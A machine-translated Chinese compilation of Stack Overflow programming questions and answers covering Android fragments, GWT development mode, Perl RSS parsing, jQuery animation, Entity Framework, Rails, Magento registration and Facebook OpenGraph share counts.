> 时间：2015-04-15T06:52:49.237

我将 xml 文件复制到 Android/Plugin/res/xml/ 并找到此资源！！！但是当我将 laoyout-file 复制到 Android/Plugin/res/layout - 我收到异常，当为 android 构建 unity3d 时：

错误构建播放器：CommandInvokationFailure：重新打包资源失败。有关详细信息，请参阅控制台。/Android-SDK/sdk/build-tools/22.0.0/aapt package --auto-add-overlay -v -f -m -J gen -M AndroidManifest.xml -S "res" -I "/Android-SDK /sdk/platforms/android-22/android.jar" -F bin/resources.ap_ --extra-packages com.prime31.IAB:com.facebook.android:com.google.android.gms -S "/Projects/ bottle_client_unity/Bottle_Unity/Temp/StagingArea/android-libraries/facebook/res" -S "/Projects/bottle_client_unity/Bottle_Unity/Temp/StagingArea/android-libraries/google-play-services_lib/res"

stderr [ res/drawable/com_facebook_close.png：libpng 警告：iCCP：无法识别已编辑的已知 sRGB 配置文件 res/drawable-ldpi/com_facebook_close.png：libpng 警告：iCCP：无法识别已编辑的已知 sRGB 配置文件 res/ drawable-hdpi/com_facebook_close.png：libpng 警告：iCCP：无法识别已编辑的已知 sRGB 配置文件 res/drawable-xhdpi/com_facebook_close.png：libpng 警告：iCCP：无法识别已编辑的已知 sRGB 配置文件

# java - Fragment中使用ListView时适配器不调用getView()

> ID：13841333
> 
> 赞同：0
> 
> 时间：2012-12-12T13:54:14.087
> 
> 标签：java, android, listview, android-fragments, adapter

因此，在编写您的应用程序时，我遇到了另一个“意外”问题。我知道有ListFragment，但是使用了Fragment。当我为一个 ListView 的片段添加标记时，当你调用适配器时，列表中的功能不会添加元素——这不是我在日志上跟踪的一种狡猾的方式，即你不调用 getView()。更有趣的是 - 如果我不使用片段列表而不是仅使用片段列表，并且您添加的适配器在所有内容都运行良好时 - 列表已填满。我不明白为什么会发生这种情况——为什么在作品的片段列表中不够用。

**活动开始.xml**

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"    
    android:descendantFocusability="beforeDescendants"
    android:focusableInTouchMode="true"
    android:scrollbars="vertical"
    android:scrollbarStyle="insideInset"
    android:gravity="center_vertical"
    android:orientation="vertical"
    android:background="#e8e8e8" 
    >

<Button 
    android:id="@+id/button_add_url"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_gravity="center"
    android:drawableRight="@drawable/green_add"
    android:drawablePadding="5dp"
    android:text="ADD URL"
    />    

 <LinearLayout
    android:id="@+id/linear_layout_list_show_monitor_url"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:background="@drawable/border_background"
    android:orientation="vertical"
    android:padding="1dp"
    android:layout_marginLeft="16dp"
    android:layout_marginRight="16dp"
    >

   <!--  <ListView
        android:id="@+id/list_view_fragment"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"/> -->    

     <fragment
         android:id="@+id/fragment_list"
         android:name="pront.android.exservice.FragmentList"
         android:layout_width="match_parent"
         android:layout_height="300dp"/>           

 </LinearLayout> 
```

**开始活动.java**

```
import java.util.ArrayList;
import pront.android.exservice.FragmentDialogAddNewUrl.FragmentDialogAddNewUrlConectActivity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.support.v4.app.DialogFragment;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TableLayout.LayoutParams;
import android.widget.Toast;

public class StartActivity 
                        extends FragmentActivity 
                        implements OnClickListener,
                                   FragmentDialogAddNewUrlConectActivity
{

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    this.requestWindowFeature(Window.FEATURE_NO_TITLE);
    this.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
    this.getWindow().addFlags
    (WindowManager.LayoutParams.FLAG_FULLSCREEN); 
    setContentView(R.layout.activity_start);
    listViewUrl = (ListView) findViewById(R.id.list_view_fragment);
    screenWidthPx = this.getResources().getDisplayMetrics().widthPixels;
    screenHeightPx = this.getResources().getDisplayMetrics().heightPixels;
    layoutMarginPx = 16;
    screenDp = this.getResources().getDisplayMetrics().density;
    layoutMarginDp = (int)(layoutMarginPx*screenDp);
    typefaceRoboto = Typeface.createFromAsset(getAssets(),
            "Roboto-Thin.ttf");
    LinearLayout linearLayout = (LinearLayout) 
            findViewById(R.id.linear_layout_list_show_monitor_url);
    LayoutParams layoutParams = 
            new LayoutParams(LayoutParams.FILL_PARENT,
                    LayoutParams.WRAP_CONTENT);        
    layoutParams.setMargins(layoutMarginDp, layoutMarginDp,
            layoutMarginDp, layoutMarginDp);
    linearLayout
        .setLayoutParams(layoutParams); 
    buttonAddUrl = (Button) findViewById(R.id.button_add_url);
    buttonAddUrl.setTypeface(typefaceRoboto, Typeface.BOLD);
    buttonAddUrl.setOnClickListener(this);        
    broadcastReceiver = new MyBroadcastReceiver();
    intentFilter = new IntentFilter(BROADCAST);
    registerReceiver(broadcastReceiver, intentFilter);
}

public void onStart(){
    super.onStart();
}

public void onRestart(){
    super.onRestart();
}

public void onResume(){
    super.onResume();
}

public void onPause(){
    super.onPause();
}

public void onStop(){
    super.onStop();
}

public void onDestroy(){
    unregisterReceiver(broadcastReceiver);
    super.onDestroy();
}

@Override
public void onBackPressed(){
    super.onBackPressed();

}

public void onClick(View view) {
    if(view.getId() == R.id.button_add_url){
        buttonAddUrl.setClickable(false);
        fragmentDialogAddNewUrl = new FragmentDialogAddNewUrl();
        fragmentDialogAddNewUrl.show(this.getSupportFragmentManager(),
                "fragmentDialogAddNewUrl");
        buttonAddUrl.setClickable(true);
    }        
} 

public void fragmentDialogClickButtonListener(String url, 
                                                String pathFavIcon)
{
    fragmentDialogAddNewUrl.onDestroyView();        
    this.url = url;
    Toast toastInfo = Toast
                    .makeText(this.getApplicationContext(),
                    "Service start monitor\n"+url,
                    Toast.LENGTH_LONG);
    toastInfo.setGravity(Gravity.TOP, 0, 0);
    toastInfo.show(); 
    arrayListUrl.add(new UrlBox(this.getApplicationContext(),
            url,
            pathFavIcon));
    Log.d("StartActivity", "fragmentDialogClick...() listViewUrl.setAdapter()");
    FragmentList fragmentList = (FragmentList) this.getSupportFragmentManager().findFragmentById(R.id.fragment_list);
    fragmentList.setAdapter(arrayListUrl);
//        MyListAdapter adapter = new MyListAdapter(this, R.layout.expandable_list_view_child_item, arrayListUrl);
//        adapter.notifyDataSetChanged();
//        listViewUrl.setAdapter(adapter);                
}

public static class MyBroadcastReceiver extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("", intent.getIntExtra("RESULT", 0)+"");                      
    }

}   

private Button buttonAddUrl;
private ListView listViewUrl;

private MyBroadcastReceiver broadcastReceiver;    
private IntentFilter intentFilter;
private Typeface typefaceRoboto;
private DialogFragment fragmentDialogAddNewUrl;

private MyListAdapter myListAdapter = null;
private ArrayList<UrlBox> arrayListUrl = new ArrayList<UrlBox>();
private int layoutMarginPx;    
private float screenDp;
private int screenWidthPx;
private int screenHeightPx;
private int layoutMarginDp;
private ArrayList<String> childUrl = new ArrayList<String>();
private ArrayList<Drawable> childFavIcon = new ArrayList<Drawable>();
private String url;
private final static String BROADCAST = "pront.android.exservice";

} 
```

**片段列表.java**

```
import java.util.ArrayList;
import android.app.Activity;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ListView;

public class FragmentList extends Fragment {

@Override
public void onAttach(Activity activity){ 
    super.onAttach(activity);
}

@Override
public void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);     
}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState){
    listView = (ListView) inflater.inflate(R.layout.layout_fragment_list, null, false).findViewById(R.id.list_view_fragment);
    return inflater.inflate(R.layout.layout_fragment_list, null, false);
}

public void setAdapter(ArrayList<UrlBox> arrayList){
    listAdapter = new MyListAdapter(getActivity(), R.layout.expandable_list_view_child_item, arrayList);
    listAdapter.notifyDataSetChanged();
    if(listView != null){
        listView.setAdapter(listAdapter);           
        System.out.println("set adapter");
    }        
}

MyListAdapter listAdapter;
ListView listView;  

} 
```

**MyListAdapter.java**

```
import java.util.ArrayList;
import android.app.Activity;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.TextView;

public class MyListAdapter extends ArrayAdapter{

MyListAdapter(Activity context, int layoutResourceId, ArrayList<UrlBox> arrayList) {
    super(context, layoutResourceId);
    Log.d("MyListAdapter", "constructor");
    this.context = context;
    this.arrayListUrlBox = arrayList;
    this.layoutResourceId = layoutResourceId;
}

@Override
public View getView (int position, View convertView, ViewGroup parent){
    Log.d("MyListAdapter", "getView");
    View returnView = convertView;
    ListItemTagHolder tag  = null;
    if(convertView == null){
        LayoutInflater inflater = context.getLayoutInflater();
        returnView = inflater.inflate(layoutResourceId, null, false);
        tag = new ListItemTagHolder();
        tag.ImageViewFavicon = (ImageView) returnView.findViewById(R.id.image_view_favicon);
        tag.ImageViewStatus = (ImageView) returnView.findViewById(R.id.image_view_status);
        tag.TextViewUrl = (TextView) returnView.findViewById(R.id.text_view_url);
        returnView.setTag(tag);
    }
    else{
        tag = (ListItemTagHolder) returnView.getTag();
    }
    tag.ImageViewFavicon.setImageDrawable(arrayListUrlBox.get(position).getDrawableFavIcon());
    tag.ImageViewStatus.setImageDrawable(arrayListUrlBox.get(position).getDrawableFavIcon()); // !
    tag.TextViewUrl.setText(arrayListUrlBox.get(position).getUrl());
    return returnView;      
}

 @Override
 public int getCount() {
     return arrayListUrlBox.size();
 }

 public UrlBox getItem(int position) {
     return arrayListUrlBox.get(position);
 }

private ArrayList<UrlBox> arrayListUrlBox;
private Activity context;
private int layoutResourceId;

static class ListItemTagHolder{
    protected ImageView ImageViewFavicon;
    protected ImageView ImageViewStatus;
    protected TextView TextViewUrl;
}   
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:56:55.913

该问题与`MyListAdapter`. 你有两个选择：

1.  覆盖`getCount()`并让它返回数据集中的项目数
2.  将您的数据集传递给 super()

    例如，在您的适配器中：

    ```
    @Override
    public int getCount() {
       return arrayListUrlBox.size();
    } 
    ```

    或在 MyListAdapter 构造函数中，您可以调用：

    ```
     super(context, layoutResourceId, arrayList); 
    ```

    代替

    ```
    super(context, layoutResourceId); 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-29T10:24:17.210

嗨修改你的 MyListAdapter 如下

```
public class MyListAdapter extends ArrayAdapter**<UrlBox>** {

  MyListAdapter(Activity context, int layoutResourceId, ArrayList<UrlBox> arrayList) {
 super(context, layoutResourceId, arrayList);
 Log.d("MyListAdapter", "constructor", **arrayList**);
 this.context = context;
 this.arrayListUrlBox = arrayList;
 this.layoutResourceId = layoutResourceId;
}
....<continue with rest part of your code>... 
```

我已经改变了 2 个地方。希望这会起作用。

# gwt - GWT 项目无法从 Intellij 12 以开发模式启动

> ID：13841343
> 
> 赞同：0
> 
> 时间：2012-12-12T13:54:51.417
> 
> 标签：gwt, intellij-idea

我刚刚安装了 Intellij IDEA 12 的评估版来体验新功能。

我很难让我的 GWT 项目在开发模式下运行。它失败并出现以下错误：

```
 [ERROR] Unable to load class 'com.google.gwt.useragent.rebind.UserAgentPropertyGenerator' 
```

java.lang.ClassNotFoundException：com.google.gwt.useragent.rebind.UserAgentPropertyGenerator

这个相同的项目与 Intellij 9 完美运行，所以我不认为这是我的项目有问题，大概 12 中有一个配置选项我需要设置。

我正在使用 Java 6 和 GWT 2.4

任何线索都会受到重视，现在我要回到 Intellij 9。

# perl - 解析 RSS 提要，描述字段

> ID：13841345
> 
> 赞同：0
> 
> 时间：2012-12-12T13:54:55.447
> 
> 标签：perl, parsing, rss

我在 perl 中使用 SimpleXml 来提取标签中的数据

```
<description>&lt;strong&gt;CUSIP:&lt;/strong&gt; 912828UC2&lt;br /&gt;&lt;strong&gt;Term and Type:&lt;/strong&gt; 3-Year Note&lt;br /&gt;&lt;strong&gt;Offering Amount:&lt;/strong&gt; $32,000,000,000&lt;br /&gt;&lt;strong&gt;Auction Date:&lt;/strong&gt; 12/11/2012&lt;br /&gt;&lt;strong&gt;Issue Date:&lt;/strong&gt; 12/17/2012&lt;br /&gt;&lt;strong&gt;Maturity Date:&lt;/strong&gt; 12/15/2015&lt;br /&gt;&lt;a href="http://www.treasurydirect.gov/instit/annceresult/press/preanre/2012/A_20121206_6.pdf"&gt;PDF version of the announcement&lt;/a&gt;&lt;br /&gt;&lt;a href="http://www.treasurydirect.gov/xml/A_20121206_6.xml"&gt;XML version of the announcement&lt;/a&gt;&lt;br /&gt;</description> 
```

我现在无法提取单个符号。例如，对于拍卖日期，使用

> `if ($desc=~m/Auction\sDate:<\/strong>\s+(\d\d\/\d\d\/\d\d\d\d)<br/`) {
> 
> }

但我觉得它不够健壮。提取字段的标准方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:34:51.717

正如 Dan1111 在他的回答中指出的那样，如果您已经在使用 XML 解析器（Simple::XML？），您应该坚持使用它来解析描述标签中的数据。尝试从 XML/HTML 提要中解析数据不是一个好主意。使用为此目的构建的解析器。

由于您帖子中数据的格式，我假设您没有解析器可以帮助您的有效 HTML。在这种情况下，没有提取字段的“标准”方法，但这是我解决此问题的方法：

```
print "$desc\n";

my @parts = split(/;br /, $desc);
my %dates;

foreach my $part (@parts) {
  if ($part =~ m/(\w+\s+Date).+(\d{2}\/\d{2}\/\d{4})/) {
    $dates{$1} = $2;
  }
}

foreach my $label (keys %dates) {
  printf "%-16s%12s\n", "${label}:", $dates{$label};
} 
```

查看原始字符串，我可以看到有 3 个日期和其他几条记录，所以首先要做的就是将`split`它们向上。我发现字符串中的每条记录都由字符';br'分隔，因此我将其用于拆分：

`my @parts = split(/;br /, $desc);`

之后，我有一个数组，其中包含字符串中每个不同的数据部分。现在，我只需要解析每个部分。因为您的问题对拍卖日期值感兴趣，所以我编写了一个正则表达式来捕获日期。预计其他日期也可能有价值，我修改了我的正则表达式，以便我可以捕获标签（拍卖、发行、成熟度），并将每个标签日期对存储在哈希（%dates）中：

```
foreach my $part (@parts) {
  if ($part =~ m/(\w+\s+Date).+(\d{2}\/\d{2}\/\d{4})/) {
    $dates{$1} = $2;
  }
} 
```

最后，我刚刚打印出我的哈希：

```
foreach my $part (@parts) {
  if ($part =~ m/(\w+\s+Date).+(\d{2}\/\d{2}\/\d{4})/) {
    $dates{$1} = $2;
  }
} 
```

说得通？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:39:54.893

什么更强大取决于您的预期输入和您正在寻找的内容。但是，这里有一些您可能会觉得有帮助的东西。

我用[`XML::Twig`](http://search.cpan.org/~mirod/XML-Twig-3.42/Twig.pm)这个。 `XML::Simple`（我认为这是您现在使用的）由于各种怪癖，不建议用于新开发。

```
use Modern::Perl;
use XML::Twig;

my $twig = XML::Twig->new();
$twig->parse(<DATA>);

my %params;
my $key;
for my $child (map {$_->text} $twig->root->children)
{
    if ($child =~ /(.*):/)
    {
        $key = $1;  
    }
    else
    {
        $params{$key} = $child if (defined $key);
        undef $key;         
    }
}

say "$_ is $params{$_}" foreach (keys %params); 

__DATA__
<description><strong>CUSIP:</strong> 912828UC2<br /><strong>Term and Type:</strong> 3-Year Note<br /><strong>Offering Amount:</strong> $32,000,000,000<br /><strong>Auction Date:</strong> 12/11/2012<br /><strong>Issue Date:</strong> 12/17/2012<br /><strong>Maturity Date:</strong> 12/15/2015<br /><a href="http://www.treasurydirect.gov/instit/annceresult/press/preanre/2012/A_20121206_6.pdf">PDF version of the announcement</a><br /><a href="http://www.treasurydirect.gov/xml/A_20121206_6.xml">XML version of the announcement</a><br /></description> 
```

这将以冒号结尾的任何元素作为键，然后假定树中的下一个元素是值。显然，这对您将获得什么样的输入做出了一些假设，但只要所有“关键”元素都包含在标签中，它就非常健壮。

另一种方法是先去除所有标签，然后仅在文本中搜索键值对。你也可以这样做`XML::Twig`；只需调用`$twig->root->text`将从整个元素中获取文本。然而，在这种方法中，很难确定一个键在哪里结束，另一个值从哪里开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-15T04:24:19.583

`<description>`您显示的 RSS 提要中的元素包含有效的 XHTML 片段作为 PCDATA。该解决方案提取这些元素并对其进行解码，然后依次解析它们以访问`<strong>`元素的文本及其对应的值。

请注意，XHTML 包含多个元素，并且由于 XHTML 只允许使用单个根元素，因此我将其包装`<root>`在`$twig->parse("<root>$desc</root>")`.

希望您能够从中推断以访问您需要的数据。

```
use strict;
use warnings;

use LWP::Simple;
use XML::Twig;

my $xml = get 'http://www.treasurydirect.gov/RI/TreasuryOfferingAnnouncements.rss';

my $twig = XML::Twig->new;
$twig->parse($xml);

for my $desc ($twig->get_xpath('/rss/channel/item/description')) {
  $desc = $desc->text;
  my $twig = XML::Twig->new;
  $twig->parse("<root>$desc</root>");
  for my $strong ($twig->get_xpath('/root/strong')) {
    my ($key, $val) = ($strong->trimmed_text, $strong->next_sibling->trimmed_text);
    $key =~ s/:$//;
    print "$key => $val\n";
  }
  print "\n";
} 
```

**输出**

```
CUSIP -> 912810QY7
Term and Type -> 29-Year 11-Month Bond
Offering Amount -> $13,000,000,000
Auction Date -> 12/13/2012
Issue Date -> 12/17/2012
Maturity Date -> 11/15/2042

CUSIP -> 912796DT3
Term and Type -> 3-Day Bill
Offering Amount -> $10,000,000,000
Auction Date -> 12/13/2012
Issue Date -> 12/14/2012
Maturity Date -> 12/17/2012

CUSIP -> 912828UE8
Term and Type -> 5-Year Note
Offering Amount -> $35,000,000,000
Auction Date -> 12/18/2012
Issue Date -> 12/31/2012
Maturity Date -> 12/31/2017

CUSIP -> 912828UD0
Term and Type -> 2-Year Note
Offering Amount -> $35,000,000,000
Auction Date -> 12/17/2012
Issue Date -> 12/31/2012
Maturity Date -> 12/31/2014

CUSIP -> 912796AM1
Term and Type -> 26-Week Bill
Offering Amount -> $28,000,000,000
Auction Date -> 12/17/2012
Issue Date -> 12/20/2012
Maturity Date -> 06/20/2013

CUSIP -> 912828UF5
Term and Type -> 7-Year Note
Offering Amount -> $29,000,000,000
Auction Date -> 12/19/2012
Issue Date -> 12/31/2012
Maturity Date -> 12/31/2019

CUSIP -> 912828SQ4
Term and Type -> 4-Year 4-Month TIPS
Offering Amount -> $14,000,000,000
Auction Date -> 12/20/2012
Issue Date -> 12/31/2012
Maturity Date -> 04/15/2017

CUSIP -> 9127957M7
Term and Type -> 13-Week Bill
Offering Amount -> $32,000,000,000
Auction Date -> 12/17/2012
Issue Date -> 12/20/2012
Maturity Date -> 03/21/2013

CUSIP -> 912828TY6
Term and Type -> 9-Year 11-Month Note
Offering Amount -> $21,000,000,000
Auction Date -> 12/12/2012
Issue Date -> 12/17/2012
Maturity Date -> 11/15/2022

CUSIP -> 912828UC2
Term and Type -> 3-Year Note
Offering Amount -> $32,000,000,000
Auction Date -> 12/11/2012
Issue Date -> 12/17/2012
Maturity Date -> 12/15/2015

CUSIP -> 912796AK5
Term and Type -> 52-Week Bill
Offering Amount -> $25,000,000,000
Auction Date -> 12/11/2012
Issue Date -> 12/13/2012
Maturity Date -> 12/12/2013

CUSIP -> 9127955V9
Term and Type -> 4-Week Bill
Offering Amount -> $40,000,000,000
Auction Date -> 12/11/2012
Issue Date -> 12/13/2012
Maturity Date -> 01/10/2013

CUSIP -> 912796AL3
Term and Type -> 26-Week Bill
Offering Amount -> $28,000,000,000
Auction Date -> 12/10/2012
Issue Date -> 12/13/2012
Maturity Date -> 06/13/2013

CUSIP -> 9127957L9
Term and Type -> 13-Week Bill
Offering Amount -> $32,000,000,000
Auction Date -> 12/10/2012
Issue Date -> 12/13/2012
Maturity Date -> 03/14/2013

CUSIP -> 912796DT3
Term and Type -> 11-Day Bill
Offering Amount -> $25,000,000,000
Auction Date -> 12/04/2012
Issue Date -> 12/06/2012
Maturity Date -> 12/17/2012

CUSIP -> 9127956Z9
Term and Type -> 4-Week Bill
Offering Amount -> $40,000,000,000
Auction Date -> 12/04/2012
Issue Date -> 12/06/2012
Maturity Date -> 01/03/2013 
```

# javascript - jQuery在动画函数中设置css位置

> ID：13841348
> 
> 赞同：1
> 
> 时间：2012-12-12T13:55:00.367
> 
> 标签：javascript, jquery, css, jquery-animate

您将如何在 jQuery 中设置`position:relative`没有初始属性集的元素中的属性？`position``animate()`

这不起作用：

```
$(mLinks[id]).animate
(
    {
        position:'relative',
        left:'200px'
    }
); 
```

鉴于这`mLinks`是一个有效的 DOM 元素对象。

我也尝试使用`duration`and`callback`参数。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T13:56:46.850

“动画”css`position`属性是没有意义的，不是吗？`relative`和`absolute`或或类似的东西之间没有`static`任何东西......

这就是我要做的：

```
$(mLinks[id]).css('position', 'relative').animate
(
    {
        left:'200px'
    }
); 
```

如果你阅读了相应的[jQuery 文档](http://api.jquery.com/animate/)，你会发现：

`most properties that are non-numeric cannot be animated using basic jQuery functionality (For example, width, height, or left can be animated but background-color cannot be, unless the jQuery.Color() plugin is used).`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T13:56:43.970

该`animate`方法不允许您设置 css 属性，这是有道理的，尽管要拥有出色的动画，您必须正确设置 css 属性，这是两件不同的事情。

所以首先你应该设置css属性。你应该使用`css`方法：

```
$(mLinks[id]).css("position", "relative") 
```

之后就可以开始动画了：

```
$(mLinks[id]).animate({ left:'200px' }); 
```

将所有内容结合在一起，您将拥有：

```
$(mLinks[id]).css("position", "relative").animate({ left:'200px' }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:05:41.573

看看这段代码。

```
<html>
<head>
    <title>Hello there</title>
    <script type="text/javascript" src = "assets/js/jquery.min.js"></script>
</head>
<body>
    <div class="tobechanged" style = "background:#ddd;position:fixed;">
        hello there.
    </div>
    <script type="text/javascript">
    $('.tobechanged').css('position','relative').animate({
        opacity: 0.9,
        left: '+=50'},
        4000, function() {
        //some stuff here.
    });
    </script>
</body>
</html> 
```

现在应该可以正常工作了。

# gwt - 远程服务器上的超级开发模式

> ID：13841350
> 
> 赞同：5
> 
> 时间：2012-12-12T13:55:10.590
> 
> 标签：gwt, gwt-super-dev-mode

我工作的项目非常具体。我们将 GWT 与 SAP 后端一起使用。我们使用以下配置运行开发模式（作为程序参数；我直接使用 IntelliJ IDEA 运行项目）

```
-noserver -logLevel INFO -startupUrl http://server-url:8000/aaa -whitelist ^http[:][/][/]server-url[.]eu[:]8000/aaa com.company.project.main.Main 
```

请注意，我们没有使用本地服务器 ( `-noserver`)。

在熟悉了 Super Dev Mode 之后，我明白了，它的工作方式类似于 GWT Web Mode，即编译 JavaScript（可以指定要编译到的文件夹），然后运行托管该脚本的代码服务器。

由于项目的特殊性，编译后的 JavaScript 通过 WebDav 使用 maven 部署到远程服务器。因此，简单地指定`-workDir`为参数不会在远程服务器上部署脚本。我们也不能（至少目前）在该`server-url`地址上运行 Java 服务器。

在这种情况下我们可以使用超级开发模式吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-12T14:51:03.103

是的你可以。

**编辑 2016-11-27：**我构建了一个开发服务器，可以使用`-launcherDir`-style SuperDevMode 而无需写入服务器，通过使用类似 webpack 的代理：[https ://github.com/tbroyer/gwt-devserver](https://github.com/tbroyer/gwt-devserver)

**编辑：**有一些问题。延迟绑定属性。推荐使用 SDM（自 GWT 2.7 起）是使用`-launcherDir`这意味着使用本地服务器。

SuperDevMode 与 DevMode 的工作方式非常相似`-noserver`，这意味着您必须将应用程序至少部署一次到您的服务器。在 SuperDevMode 的情况下，这意味着您必须在`xsiframe`链接器和`devModeRedirectEnabled`属性设置为`true`.

然后你在你的机器上运行 SuperDevMode，如果还没有创建你的书签，从远程服务器加载你的应用程序，然后单击*Dev Mode On*书签。

这将在浏览器中存储一些内容，`sessionStorage`以便重新加载页面现在将从您机器上运行的 SuperDevMode 加载排列，而不是远程服务器。

More info about how SuperDevMode works: [http://blog.ltgt.net/how-does-gwts-super-dev-mode-work/](http://blog.ltgt.net/how-does-gwts-super-dev-mode-work/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:55:10.590

目前，我只看到一种可能的解决方案，即`gwt-codeserver.jar`在 SAP 服务器上以某种方式运行（使用地址，比如说，`http://server-url:8000/bbb`）并编写一个 servlet，它将所有请求重定向到`http://server-url:8000/aaa`. 然而，这并不容易实现。SAP 服务器具有“棘手”的身份验证机制，用户首先看到登录页面，然后将他们重定向到生成的特定于会话的 URL。

非常欢迎其他想法。

# c# - 更新实体框架中的组合对象

> ID：13841356
> 
> 赞同：0
> 
> 时间：2012-12-12T13:55:21.493
> 
> 标签：c#, entity-framework-4

我正在使用 Entity Framework 4.4，并且在处理断开的对象时遇到以下问题。我有一个类具有另一个实例作为属性。当我这样插入时，一切都很好：

```
var thumbnail = new Thumbnail();
var adn = new Adn { Thumbnail = thumbnail };
var adnRepo = new AdnRepository();
adn = adnRepo.Create(adn); 
```

在这种情况下，adn 和 thumbnail 都会保存到数据库中。持久化的代码是这样的：

```
context.Set<T>().Add(instance); 
```

问题是当我尝试更新 adn. 它适用于标量属性，但我不知道如何使它适用于缩略图。

```
var adn = new Adn();
var adnRepo = new AdnRepository();
adn = adnRepo.Create(adn);

var thumbnail = new Thumbnail();
adn.Thumbnail = thumbnail;
adn = adnRepo.Update(adn); 
```

更新是这样的：

```
context.Entry(instance).State = EntityState.Modified; 
```

在这种情况下，adn 已保存，但缩略图未保存。

我必须使其工作的替代方法是什么（请注意，我的实体没有 id 字段）

# ruby-on-rails-3 - Rails如何在模型中获取当前登录的用户对象而不从控制器传递它

> ID：13841357
> 
> 赞同：1
> 
> 时间：2012-12-12T13:55:21.513
> 
> 标签：ruby-on-rails-3, callback, devise

我正在使用设计 1.4.8

我想在回调方法中分配当前登录用户的*id 。*

如何在不从控制器传递的情况下在模型中使用当前用户的*ID ？*

在模型中还有其他方法可以做到这一点吗？

# magento - 在 Magento 上注册绕过验证

> ID：13841358
> 
> 赞同：1
> 
> 时间：2012-12-12T13:55:24.307
> 
> 标签：magento

我的一个网站已经通过了一些安全测试。

尽管这通过了安全性（因为代码失败），但我对这些方法感到好奇。

该网站有几个“新用户”尝试和失败的 SQL 注入。

现在该电子邮件不是有效的电子邮件地址，并且我们在表单上有一个似乎已被绕过的验证码（因为我们认为它是一个脚本）

有谁知道会发生用户注册的任何地方会绕过通常的控制器（ Mage_Customer_AccountController::createPostAction() ）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:34:23.530

我所知道的创建客户的唯一其他方法是[通过 API](http://www.magentocommerce.com/api/soap/customer/customer.create.html)。我从来没有真正使用过核心 API，但快速浏览一下，我不确定这是否真的在客户模型上调用了 validate，所以它似乎是一个可行的选择。

# facebook - OpenGraph 现在显示某些页面的共享计数

> ID：13841361
> 
> 赞同：1
> 
> 时间：2012-12-12T13:55:29.390
> 
> 标签：facebook, facebook-opengraph

我在我制作的网站上遇到了问题。

Facebook opengraph 未显示某些页面的共享数...

例如，我这里只有 id 和共享计数： http: [//graph.facebook.com/http](http://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/epoca-colour-2/) [://www.richardmarazziphoto.com/portfolios/epoca-colour-2/ http://graph.facebook。 com/http://www.richardmarazziphoto.com/portfolios/amourica-2/](http://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/amourica-2/)

但在这 2 页上，我有所有其他信息，但不包括股票数量： [http](http://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/yyz/) [://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/yyz/ http://graph.facebook。 com/http://www.richardmarazziphoto.com/portfolios/south-of-the-border-2/](http://graph.facebook.com/http://www.richardmarazziphoto.com/portfolios/south-of-the-border-2/)

这些页面具有相同的模板（它是 WordPress 中的一个网站，所有这些页面都使用相同的 php 模板文件......）

我做错什么了吗？！我该如何解决？为什么具有基本相同模板的页面显示不同的信息？

我已经检查了[https://developers.facebook.com/tools/debug](https://developers.facebook.com/tools/debug) 并且我的 og 标签上没有任何错误..

非常感谢！斯特凡诺

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:24:14.567

我有完全相同的问题。（不是 WP，而是 PHP 模板页面）。调试器中绝对没有 OG 错误......我已经用谷歌搜索了这个问题并重新阅读了 OG 文档，但无济于事。我能看到的唯一模式是在某个日期之前发布的任何页面都有效，之后的所有内容都无效。可能我无意中更改了一些重要的东西，而 FB 正在缓存旧版本的信息？但是，正如我所说，调试器抓取是最新的，旧的和最近发布的页面没有区别。

没有股票显示： [http ://graph.facebook.com/?ids=http://www.aspenbusinessjournal.com/article.php?id=7873](http://graph.facebook.com/?ids=http://www.aspenbusinessjournal.com/article.php?id=7873)

股票显示： [http ://graph.facebook.com/?ids=http://www.aspenbusinessjournal.com/article.php?id=7800](http://graph.facebook.com/?ids=http://www.aspenbusinessjournal.com/article.php?id=7800)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-18T21:51:06.100

好的，所以我遇到了同样的问题。我所做的是尝试在不带斜杠的情况下通过图表运行 URL。例如：

